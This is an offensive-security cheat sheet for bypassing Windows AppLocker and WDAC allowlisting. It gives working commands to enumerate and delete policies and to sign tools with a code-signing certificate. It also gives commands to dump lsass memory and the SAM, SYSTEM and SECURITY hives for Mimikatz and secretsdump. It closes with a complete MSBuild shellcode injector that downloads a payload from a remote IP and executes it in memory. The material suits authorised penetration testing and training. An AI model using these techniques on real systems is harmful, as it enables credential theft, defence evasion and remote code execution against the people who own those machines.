## Application Allowlisting
- [Applocker](#applocker)
- [Windows Application Control](#windows-application-control)
- [Bypass application allowlisting](#bypass-application-allowlisting)

## Applocker
- AppLocker rules are split into 5 categories - `Executable`, `Windows Installer`, `Script`, `Packaged App` and `DLLs`, and each category can have its own enforcement (enforced, audit only, none).
- AppLocker has a set of default allow rules such as, `allow everyone to execute anything within C:\Windows\*` - the theory being that everything in `C:\Windows` is trusted and safe to execute.
- The difficulty of bypassing AppLocker depends on the robustness of the rules that have been implemented. The default rule sets are quite trivial to bypass in a number of ways:
  - Executing untrusted code via trusts LOLBAS's.
  - Finding writeable directories within "trusted" paths.
  - By default, AppLocker is not even applied to Administrators.
- Uploading into `C:\Windows` requires elevated privileges, but there are places like `C:\Windows\Tasks` that are writeable by standard users. 
- DLL enforcement very rarely enabled due to the additional load it can put on a system, and the amount of testing required to ensure nothing will break.
- Good repo for bypasses: https://github.com/api0cradle/UltimateAppLockerByPassList

#### Check if Applocker is enabled
```
Get-AppLockerPolicy -Effective
```

#### Enumerate Applocker policy
```
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

```
Get-ChildItem "HKLM:Software\Policies\Microsoft\Windows\SrpV2"
Get-ChildItem "HKLM:Software\Policies\Microsoft\Windows\SrpV2\Exe"

reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2
```

#### Check policy with GPOresult
- Open the HTLM file locally
```
gpresult /H gpos.html
```

#### Parse GPO applocker
- https://github.com/PowerShell/GPRegistryPolicy
```
Get-DomainGPO -Identity *applocker*
Parse-PolFile "<GPCFILESYSPATH FROM GET-DOMAINGPO>\Machine\Registry.pol" | select ValueName, ValueData
```

#### If code integrity is enforced and PowerShell is running in Constrained Langauge Mode use winrs instead of psremoting
```
runas /netonly /user:<DOMAIN\<USER> cmd.exe
winrs -r:<PC NAME> cmd
```

#### Check for the policy on disk
- `.p7b` is a signed policy
- Check if there are any `.xml` files which didn't got removed with the policy
```
ls C:\Windows\system32\CodeIntegrity
```

## Windows Application Control
- Tool to bypass: https://github.com/nettitude/Aladdin

#### Check for WDAC
- `SecurityServicesConfigured` and `SecurityServicesRunning` values are:
  - `0` No services configured/running
  - `1` If present, Credential Guard is configured/running.
  - `2` If present, HVCI is configured/running.
  - `3` If present, System Guard Secure Launch is configured/running.
  - `4` If present, SMM Firmware Measurement is configured/running.

```
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard
```

#### Check for policies
- `.p7b` is a signed policy
- Policies stored in `C:\Windows\System32\CodeIntegrity` either in a Single file `SiPolicy.p7b` or multiple policies in `\CiPolicies`.
- Check if there are any `.xml` files which didn't got removed with the policy
```
ls C:\Windows\system32\CodeIntegrity
```

#### Check for readable xml policies
```
ls C:\Windows\system32\CodeIntegrity -Recurse -Include *.xml
```

### Disable WDAC
- Policy in `C:\Windows\System32\CodeIntegrity\` in a `.p7b` file. Delete the file and reboot to delete policy.
- Only works if WDAC isn't enforced through GPO but setup locally!

#### Code signing WDAC
- Code signing ensures that files weren't tampered with and are verified by a trusted authority.
- ADCS code signing EKU = `Code Signing` (`1.3.6.1.5.5.7.3.3`)
- Requires Code Signing cert to be extracted from a system, or created through ADCS and it should be allowed in the WDAC policy!

#### Convert Pem to PFX with openssl
```
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

#### Check .pfx file for code signing EKU
-  `Code Signing 1.3.6.1.5.5.7.3.3`
-  `Cert Hash(sha1)` to validate cert hash
```
certutil -v -dump -p "<PASSWORD>" <PATH TO PFX>
```

#### Sign a tool
- https://learn.microsoft.com/en-us/dotnet/framework/tools/signtool-exe
```
.\signtool.exe sign /fd SHA256 /a /f <PATH TO PFX FILE> /p '<PASSWORD>' <EXE TO SIGN>
```

#### Get Signer Certificate of tool
```
Get-AuthenticodeSignature -FilePath <PATH TO EXE>
```

## Bypass application allowlisting
- https://github.com/bohops/UltimateWDACBypassList

#### LOLBAS
- Use Microsoft Signed Binaries to exploit https://lolbas-project.github.io/
- Can be used to bypass Applocker or WDAC

#### rundll32.exe and comsvcs.dll dumping lsass:
```
Get-Process | Select-String lsass
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <PROCESS ID> C:\Users\Public\lsass.dmp full
dir C:\Users\Public\lsass.dmp

Invoke-Mimikatz -Command '"sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords"'
```

#### Reg.exe dumping sam
```
reg save HKLM\SECURITY security.bak
reg save HKLM\SYSTEM system.bak
reg save HKLM\SAM sam.bak

Invoke-Mimikatz -Command '"lsadump::sam system.bak sam.bak"'
secretsdump.py -sam sam.bak -security security.bak -system system.bak local
```

#### rundll32.exe dll payload
```
C:\Windows\System32\rundll32.exe <FILE>.dll,StartW
```

### Msbuilt.exe
- Can be used to execute arbitrary C# code from a `.csproj` or `.xml` file.
```
msbuild.exe <FILE>
```

#### Example shellcode injector
```
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="MSBuild">
   <MSBuildTest/>
  </Target>
   <UsingTask
    TaskName="MSBuildTest"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
     <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[

            using System;
            using System.Net;
            using System.Runtime.InteropServices;
            using Microsoft.Build.Framework;
            using Microsoft.Build.Utilities;

            public class MSBuildTest :  Task, ITask
            {
                public override bool Execute()
                {
                    byte[] shellcode;
                    using (var client = new WebClient())
                    {
                        client.BaseAddress = "http://<IP>";
                        shellcode = client.DownloadData("shellcode.bin");
                    }
      
                    var hKernel = LoadLibrary("kernel32.dll");
                    var hVa = GetProcAddress(hKernel, "VirtualAlloc");
                    var hCt = GetProcAddress(hKernel, "CreateThread");

                    var va = Marshal.GetDelegateForFunctionPointer<AllocateVirtualMemory>(hVa);
                    var ct = Marshal.GetDelegateForFunctionPointer<CreateThread>(hCt);

                    var hMemory = va(IntPtr.Zero, (uint)shellcode.Length, 0x00001000 | 0x00002000, 0x40);
                    Marshal.Copy(shellcode, 0, hMemory, shellcode.Length);

                    var t = ct(IntPtr.Zero, 0, hMemory, IntPtr.Zero, 0, IntPtr.Zero);
                    WaitForSingleObject(t, 0xFFFFFFFF);

                    return true;
                }

            [DllImport("kernel32", CharSet = CharSet.Ansi)]
            private static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)]string lpFileName);
    
            [DllImport("kernel32", CharSet = CharSet.Ansi)]
            private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

            [DllImport("kernel32")]
            private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            private delegate IntPtr AllocateVirtualMemory(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            private delegate IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

            }

        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

#### Example PowerShell clm
```
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="MSBuild">
   <MSBuildTest/>
  </Target>
   <UsingTask
    TaskName="MSBuildTest"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
     <Task>
     <Reference Include="System.Management.Automation" />
      <Code Type="Class" Language="cs">
        <![CDATA[

            using System;
            using System.Linq;
            using System.Management.Automation;
            using System.Management.Automation.Runspaces;

            using Microsoft.Build.Framework;
            using Microsoft.Build.Utilities;

            public class MSBuildTest :  Task, ITask
            {
                public override bool Execute()
                {
                    using (var runspace = RunspaceFactory.CreateRunspace())
                    {
                      runspace.Open();

                      using (var posh = PowerShell.Create())
                      {
                        posh.Runspace = runspace;
                        posh.AddScript("$ExecutionContext.SessionState.LanguageMode");
                                                
                        var results = posh.Invoke();
                        var output = string.Join(Environment.NewLine, results.Select(r => r.ToString()).ToArray());
                        
                        Console.WriteLine(output);
                      }
                    }

                return true;
              }
            }

        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```
